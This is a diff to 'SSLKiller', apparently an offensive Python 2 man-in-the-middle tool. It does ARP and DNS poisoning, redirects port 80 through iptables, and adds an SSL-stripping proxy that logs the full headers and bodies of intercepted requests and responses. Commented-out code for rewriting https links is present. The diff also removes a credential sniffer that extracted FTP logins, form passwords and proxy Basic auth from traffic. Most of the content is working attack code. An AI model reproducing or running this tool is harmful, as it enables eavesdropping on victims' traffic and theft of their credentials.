@@ -19,7 +19,7 @@
 # Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
 # USA
 
-version = 0.3
+version = 0.4
 banner = """\n
 
   ██████   ██████  ██▓        ██ ▄█▀ ██▓ ██▓     ██▓
@@ -50,11 +50,56 @@ import sys
 import threading
 import fcntl
 import struct
-import random
 from time import sleep
 from scapy.all import *
-#from scapy.layers import http
 from netfilterqueue import NetfilterQueue
+from core.proxy2 import *
+from collections import deque
+
+class SSLStripRequestHandler(ProxyRequestHandler):
+    replaced_urls = deque(maxlen=1024)
+    def request_handler(self, req, req_body):
+	print "\n-----------------------------[Request]--------------------------------"
+	if req.headers:
+		print "[+]Original Headers:"
+		print req.headers
+	if req_body:
+		print "\n[+]Original Body:"
+		print req_body
+
+	#Replace the stripped response to server
+	#Need to modify the DnsPoisoner to resolve http://w + realdomain into the real https:// + realdomain
+	#Need to get and clear cookies
+        #if req.path in self.replaced_urls:
+        #    req.path = req.path.replace('http://w', 'https://')
+
+	print "\n----------------------------------------------------------------------"
+    def response_handler(self, req, req_body, res, res_body):
+	print "\n----------------------------[Response]--------------------------------"
+	if res.headers:
+		print "\n[+]Original Headers:"
+		print res.headers
+		print
+	if res_body:
+		print "\n[+]Original Body:"
+		print res_body
+		print
+
+	#Weak need to enhance
+	#[META] Remove all https:// links and protections
+	# ex: Remove HSTS Headers, Protection
+
+        #def replacefunc(m):
+        #    http_url = "http://" + m.group(1)
+        #    self.replaced_urls.append(http_url)
+        #    return http_url
+        #re_https_url = r"https://([-_.!~*'()a-zA-Z0-9;/?:@&=+$,%]+)"
+        #if 'Location' in res.headers:
+        #    res.headers['Location'] = re.sub(re_https_url, replacefunc, res.headers['Location'])
+        #return re.sub(re_https_url, replacefunc, res_body)
+
+	print "\n----------------------------------------------------------------------"
+
 
 class SSLKiller(object):
 
@@ -110,11 +155,8 @@ class SSLKiller(object):
 	    	    sys.stdout.flush()
 		self.ArpPoisoner()
 		sys.stdout.write("\n[+] ARP Poisoner thread loaded")
-		self.DnsPoisoner()
-		print "\n[+] DNS Poisoner thread loaded"
-		self.SSLPoisoner()
-		#pcap = sniff(prn=self.Sniffer, iface=self.interface)
-
+		#self.DnsPoisoner()
+		#print "\n[+] DNS Poisoner thread loaded"
 
 	def ArpPoisoner(self):
 		#ARP Spoof both ways, target and gateway
@@ -133,7 +175,7 @@ class SSLKiller(object):
 		#ArpPoison()
 
 	def DnsPoisoner(self):
-		#Use netfilterqueue + scapy to manipulate DNS packets "
+		#Need to add legitimate responses to domains like (4 x 'w's) > wwww.google.com"
 		def callback(packet):
 			payload = packet.get_payload()
 			pkt = IP(payload)
@@ -159,61 +201,6 @@ class SSLKiller(object):
 		DnsThread()
 		#DnsPoison()
 
-	def SSLPoisoner(self):
-		##############   INCOMPLETE   ##############################################################
-		#Use netfilterqueue + scapy + scapy-http to strip and modify the HTTP requests and responses
-		#in order to strip ssl links and protection headers
-		def callback(packet):
-			payload = packet.get_payload()
-			pkt = IP(payload)
-			if pkt.haslayer(HTTP):
-				pkt.show()
-			packet.accept()
-		def SSLThread():
-			t = threading.Thread(name='SSLpoison', target=SSLPoison)
-			t.setDaemon(True)
-			t.start()
-		def SSLPoison():
-			os.system('iptables -t nat -A PREROUTING -p tcp --dport 80 -j NFQUEUE --queue-num 2')
-			os.system('iptables -t nat -A PREROUTING -p tcp --sport 80 -j NFQUEUE --queue-num 2')
-			q = NetfilterQueue()
-			q.bind(2, callback)
-			q.run()
-		#SSLThread()
-		#SSLPoison()
-
-	def Sniffer(self, p):
-		#Sniff for credentials
-        	if p.haslayer(TCP):
-                	if p.haslayer(Raw):
-				load = str(p[Raw].load).replace("\n"," ")
-				p[Raw].load
-                                user_regex = '([Ee]mail|[Uu]ser|[Uu]sername|[Ll]ogin|[Ll]ogin[Ii][Dd]|[Uu]name|[Uu]suario)=([^&|;]*)'
-                                pw_regex = '([Pp]assword|[Pp]ass|[Pp]asswd|[Pp]wd|[Pp][Ss][Ww]|[Pp]asswrd|[Pp]assw)=([^&|;]*)'
-                                pxy_regex = '([Ww]ww-[Aa]uthorization:|[Ww]ww-[Aa]uthentication:|[Pp]roxy-[Aa]uthorization:|[Pp]roxy-[Aa]uthentication:) Basic (.*?) '
-                                if load.startswith('USER'):
-                                        method = load.split("USER")
-                                        user = str(method[1]).split("\r")
-                                        print "\n[$$$] FTP Login found: " + ''.join(user) + "\n"
-                                elif load.startswith('PASS'):
-                                        method = load.split("PASS")
-                                        passw = str(method[1]).split("\r")
-                                        print "\n[$$$] FTP Password found: " + ''.join(passw) + "\n"
-                                else:
-                                        users = re.findall(user_regex, load)
-                                        passwords = re.findall(pw_regex, load)
-                                        proxy = re.findall(pxy_regex, load)
-		        	        if users:
-        			                print "\n[$$$] Login found: " + str(users[0][1]) + "\n"
-        			        if passwords:
-        			                print "\n[$$$] Password found: " + str(passwords[0][1]) + "\n"
-        			        if proxy:
-        			                try:
-        			                        print "\n[$$$] Proxy credentials: " + str(proxy[0][1]).decode('base64') + "\n"
-        			                except:
-        	        		                print "\n[$$$] Proxy credentials: " + str(proxy[0][1]) + "\n"
-		else:
-			return
 
 if __name__ == "__main__":
 
@@ -234,14 +221,18 @@ if __name__ == "__main__":
 				index = sys.argv.index(x) + 1
 				gateway = sys.argv[index]
 		sslkill = SSLKiller(interface, target, gateway)
+		os.system("iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080")
+		Proxy(HandlerClass=SSLStripRequestHandler)
+
 	except KeyboardInterrupt:
 		print "[!] Aborted..."
                 os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
+		os.system('iptables -t nat -F')
 		exit(0)
-	except Exception as e:
-		print banner
-		print help
-		print "[!] Exception caught: {}".format(e)
-                os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
-		exit(0)
+	#except Exception as e:
+	print banner
+	print help
+	print "[!] Exception caught: {}".format(e)
+	os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
 	os.system('iptables -t nat -F')
+	exit(0)
